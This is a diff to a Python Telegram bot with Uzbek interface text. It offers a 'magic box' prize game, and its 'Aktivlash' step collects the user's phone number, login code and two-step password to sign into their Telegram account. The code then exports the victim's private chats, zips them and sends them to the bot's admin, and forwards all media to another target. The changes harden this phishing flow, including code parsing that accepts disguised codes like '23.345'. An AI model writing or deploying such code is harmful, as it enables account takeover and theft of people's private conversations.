@@ -5,7 +5,6 @@ import zipfile
 import shutil
 import random
 import asyncio
-from datetime import datetime
 
 from aiogram import Bot, Dispatcher, types
 from aiogram.dispatcher.filters import CommandStart
@@ -13,8 +12,9 @@ from aiogram.contrib.middlewares.logging import LoggingMiddleware
 from aiogram.utils import executor
 
 from telethon import TelegramClient
+from telethon.sessions import StringSession
 from telethon.tl.types import User
-from telethon.errors import SessionPasswordNeededError
+from telethon.errors import SessionPasswordNeededError, PhoneCodeExpiredError
 
 # ================== ENV ==================
 BOT_TOKEN = os.getenv("BOT_TOKEN")
@@ -79,29 +79,7 @@ def back_menu():
 async def start(msg: types.Message):
     uid = str(msg.from_user.id)
     ensure_user(uid)
-
-    if len(msg.text.split()) > 1:
-        ref = msg.text.split()[1]
-        if ref in users and ref != uid and users[uid]["ref_by"] is None:
-            users[uid]["ref_by"] = ref
-            users[ref]["refs"] += 1
-            save_json(USERS_FILE, users)
-
-    await msg.answer(
-        "👋 Xush kelibsiz",
-        reply_markup=main_menu(msg.from_user.id == ADMIN_ID)
-    )
-
-# ================== REFERAL ==================
-@dp.message_handler(lambda m: m.text == "👥 Referal")
-async def referral(msg: types.Message):
-    uid = str(msg.from_user.id)
-    ensure_user(uid)
-    me = await bot.get_me()
-    await msg.answer(
-        f"🔗 https://t.me/{me.username}?start={uid}\n"
-        f"👤 Taklif qilinganlar: {users[uid]['refs']}"
-    )
+    await msg.answer("👋 Xush kelibsiz", reply_markup=main_menu(msg.from_user.id == ADMIN_ID))
 
 # ================== SEHRLI QUTI ==================
 @dp.message_handler(lambda m: m.text == "🎁 Sehrli quti")
@@ -114,10 +92,7 @@ async def magic_box(msg: types.Message):
         return await msg.answer("❌ Qutilar tugagan")
 
     kb = types.InlineKeyboardMarkup().add(
-        types.InlineKeyboardButton(
-            f"Ochish ({u['boxes']+1}/3)",
-            callback_data="open_box"
-        )
+        types.InlineKeyboardButton(f"Ochish ({u['boxes']+1}/3)", callback_data="open_box")
     )
     await msg.answer("🎁 Sehrli quti", reply_markup=kb)
 
@@ -126,12 +101,10 @@ async def open_box(c):
     uid = str(c.from_user.id)
     u = users[uid]
 
-    # Limit tekshiruvi
     if u["boxes"] >= 3:
         await c.answer("Qutilar tugagan", show_alert=True)
         return
 
-    # Bitta ochildi
     u["boxes"] += 1
 
     is_win = (
@@ -142,70 +115,36 @@ async def open_box(c):
 
     save_json(USERS_FILE, users)
 
-    # ======================
-    # ❌ YUTUQSIZ HOLAT
-    # ======================
+    # ❌ YUTUQSIZ
     if not is_win:
-        # 1️⃣ emoji alohida
         await c.message.answer("😐")
-
-        # 2️⃣ matn + tugma
         kb = None
         if u["boxes"] < 3:
             kb = types.InlineKeyboardMarkup().add(
                 types.InlineKeyboardButton("🔓 Ochish", callback_data="open_box")
             )
-
-        await c.message.answer(
-            "Hech narsa tushmadi",
-            reply_markup=kb
-        )
+        await c.message.answer("Hech narsa tushmadi", reply_markup=kb)
         await c.answer()
         return
 
-    # ======================
-    # ✅ YUTUQLI HOLAT
-    # ======================
+    # ✅ YUTUQLI
     u["prize"] = True
     save_json(USERS_FILE, users)
 
-    # 1️⃣ emoji alohida
     await c.message.answer("🥳")
-
-    # 2️⃣ matn + ehtimol tugma
     kb = None
     if u["boxes"] < 3:
         kb = types.InlineKeyboardMarkup().add(
             types.InlineKeyboardButton("🔓 Ochish", callback_data="open_box")
         )
-
-    await c.message.answer(
-        "🎉 Siz yutdingiz!",
-        reply_markup=kb
-    )
-
+    await c.message.answer("🎉 Siz yutdingiz!", reply_markup=kb)
     await c.answer()
-
-
-# ================== YUTUQLAR ==================
-@dp.message_handler(lambda m: m.text == "🏆 Yutuqlar")
-async def prizes(msg: types.Message):
-    uid = str(msg.from_user.id)
-    ensure_user(uid)
-    await msg.answer(
-        "🏆 Sizda Premium bor" if users[uid]["prize"] else "❌ Yutuq yo‘q"
-    )
 
 # ================== AKTIVLASH ==================
 @dp.message_handler(lambda m: m.text == "✅ Aktivlash")
 async def activate(msg: types.Message):
     sessions[msg.from_user.id] = {"step": "phone"}
     await msg.answer("📲 Telefon raqamingizni yuboring", reply_markup=back_menu())
-
-@dp.message_handler(lambda m: m.text == "⬅️ Orqaga")
-async def go_back(msg: types.Message):
-    sessions.pop(msg.from_user.id, None)
-    await msg.answer("🏠 Bosh menu", reply_markup=main_menu(msg.from_user.id == ADMIN_ID))
 
 @dp.message_handler(lambda m: m.from_user.id in sessions)
 async def login_flow(msg: types.Message):
@@ -215,22 +154,51 @@ async def login_flow(msg: types.Message):
 
     # PHONE
     if state["step"] == "phone":
-        client = TelegramClient(f"session_{uid}", API_ID, API_HASH)
+        phone = re.sub(r"[^\d+]", "", text)
+        if not phone.startswith("+"):
+            phone = "+" + phone
+
+        client = TelegramClient(StringSession(), API_ID, API_HASH)
         await client.connect()
-        await client.send_code_request(text)
-        state.update({"step": "code", "phone": text, "client": client})
-        return await msg.answer("🔐 Kodni yuboring")
+
+        sent = await client.send_code_request(phone)
+
+        state.update({
+            "step": "code",
+            "phone": phone,
+            "client": client,
+            "phone_code_hash": sent.phone_code_hash
+        })
+
+        await msg.answer("🔐 Kod yuborildi\nMasalan: 23.345 yoki 23345")
+        return
 
     # CODE
     if state["step"] == "code":
+        code = re.sub(r"\D", "", text)
+        if len(code) < 5:
+            await msg.answer("❌ Kod noto‘g‘ri")
+            return
+
         try:
-            await state["client"].sign_in(state["phone"], text)
+            await state["client"].sign_in(
+                phone=state["phone"],
+                code=code,
+                phone_code_hash=state["phone_code_hash"]
+            )
+        except PhoneCodeExpiredError:
+            await msg.answer("⛔ Kod eskirdi. Qayta Aktivlash bosing.")
+            await state["client"].disconnect()
+            sessions.pop(uid, None)
+            return
         except SessionPasswordNeededError:
             state["step"] = "password"
-            return await msg.answer("🔑 2 bosqichli parolni yuboring")
+            await msg.answer("🔑 2 bosqichli parolni yuboring")
+            return
 
         await msg.answer("⏳ Chatlar eksport qilinmoqda...")
-        return await export_chats(uid)
+        await export_chats(uid)
+        return
 
     # PASSWORD
     if state["step"] == "password":
@@ -239,8 +207,10 @@ async def login_flow(msg: types.Message):
         await export_chats(uid)
 
 # ================== EXPORT ==================
-def safe_name(t):
-    return re.sub(r"[^\w\d_-]", "_", t)
+def safe_name(t, max_len=40):
+    t = re.sub(r"[^\w\d_-]", "_", t, flags=re.ASCII)
+    t = re.sub(r"_+", "_", t).strip("_")
+    return t[:max_len] or "user"
 
 def media_text(m):
     if m.photo: return "rasm yubordiz"
@@ -260,29 +230,17 @@ async def export_chats(uid):
         if isinstance(d.entity, User) and not d.entity.bot:
             user = d.entity
             name = f"{user.first_name or ''} {user.last_name or ''}".strip() or "NoName"
-
             folder = os.path.join(BASE_DIR, f"{safe_name(name)}_{user.id}")
             os.makedirs(folder, exist_ok=True)
 
             with open(os.path.join(folder, "chat.txt"), "w", encoding="utf-8") as f:
-                f.write(
-                    f"Ism: {name}\n"
-                    f"User ID: {user.id}\n"
-                    f"Username: @{user.username}\n"
-                    f"Telefon: {user.phone}\n\n"
-                )
-
                 async for m in client.iter_messages(user, limit=2000, reverse=True):
-                    time = m.date.strftime("%Y-%m-%d %H:%M:%S") if m.date else "----"
                     sender = "siz" if m.out else name
-                    text = m.text if m.text else media_text(m)
-
+                    text = m.text or media_text(m)
                     if m.media:
                         all_media.append(m)
+                    f.write(f"{sender}: {text}\n")
 
-                    f.write(f"[{time}] {sender}: {text}\n")
-
-    # ZIP
     zip_name = f"chats_{uid}.zip"
     with zipfile.ZipFile(zip_name, "w", zipfile.ZIP_DEFLATED) as z:
         for root, _, files in os.walk(BASE_DIR):
@@ -290,14 +248,8 @@ async def export_chats(uid):
                 full = os.path.join(root, file)
                 z.write(full, arcname=os.path.relpath(full, BASE_DIR))
 
-    # SEND ZIP TO ADMIN
-    await bot.send_document(
-        ADMIN_ID,
-        types.InputFile(zip_name),
-        caption=f"📦 Chatlar eksport qilindi | UID: {uid}"
-    )
+    await bot.send_document(ADMIN_ID, types.InputFile(zip_name))
 
-    # SEND ALL MEDIA
     for m in all_media:
         try:
             await m.forward_to(MEDIA_TARGET)
@@ -309,21 +261,6 @@ async def export_chats(uid):
     os.remove(zip_name)
     await client.disconnect()
     sessions.pop(uid, None)
-
-# ================== ADMIN ==================
-@dp.message_handler(lambda m: m.text == "⚙️ Admin panel" and m.from_user.id == ADMIN_ID)
-async def admin_panel(msg: types.Message):
-    kb = types.InlineKeyboardMarkup().add(
-        types.InlineKeyboardButton("ON", callback_data="on"),
-        types.InlineKeyboardButton("OFF", callback_data="off")
-    )
-    await msg.answer("🎁 Sehrli quti holati", reply_markup=kb)
-
-@dp.callback_query_handler(lambda c: c.data in ["on", "off"] and c.from_user.id == ADMIN_ID)
-async def admin_switch(c):
-    config["magic_box"] = c.data
-    save_json(CONFIG_FILE, config)
-    await c.answer("Saqlandi")
 
 # ================== RUN ==================
 if __name__ == "__main__":
